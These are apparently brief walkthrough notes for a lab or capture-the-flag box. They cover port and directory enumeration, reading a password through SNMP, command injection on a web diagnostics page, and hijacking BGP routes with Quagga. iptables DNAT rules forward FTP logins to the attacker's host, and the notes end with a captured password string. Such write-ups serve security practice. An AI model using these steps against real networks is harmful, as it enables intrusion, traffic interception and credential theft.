@@ -1,0 +1,40 @@
+start with nmap 
+
+got 80 and 22 
+
+sparta we find 161
+
+80 we have a webpage with no accss
+we just dirb find some hidden dir
+
+we got username admin
+
+then we enumurate snmp 161
+snmpwalk 10.10.10.105 -c public -v 2c
+
+we got some string we just login with that the string -> password
+
+we got login access
+
+diag we have something called quagga we just RCE with check and base64 decode
+we have access
+we bot user.txt
+what is quagga 
+its a bgp 
+we got some hint someone login with ftp server
+we add the 10.12.150.0/25 in bgp 
+then we restart quagga service
+
+then we ip address add 10.12.150.10 dev eth2
+we just lession 21 port 
+220
+331
+we got password
+or
+
+forward the traffic to our net
+iptables -t nat -A PREROUTING -p tcp --dport 21 -j DNAT --to-destination 10.10.xx.xx:21
+ iptables -t nat -A POSTROUTING -j MASQUERADE
+
+
+BGPtelc0rout1ng
